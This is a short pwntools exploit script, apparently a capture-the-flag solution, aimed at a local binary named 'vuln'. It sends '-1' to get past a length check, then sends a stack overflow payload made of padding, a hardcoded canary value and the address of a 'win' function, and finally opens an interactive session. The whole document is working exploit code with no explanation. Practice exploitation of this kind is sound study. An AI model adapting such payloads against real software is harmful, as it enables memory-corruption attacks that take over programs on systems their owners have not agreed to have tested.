from pwn import *

p = process("./vuln")
#p = remote("",)

buffer = b"A" * 52
canary = p64(0x7591f100)
win = p64(0x08049336)

pay = buffer
pay += canary
pay += b"A" * 8
pay += win

p.sendlineafter(b"> ",b"-1")
p.sendlineafter(b"> ",pay)

p.interactive()
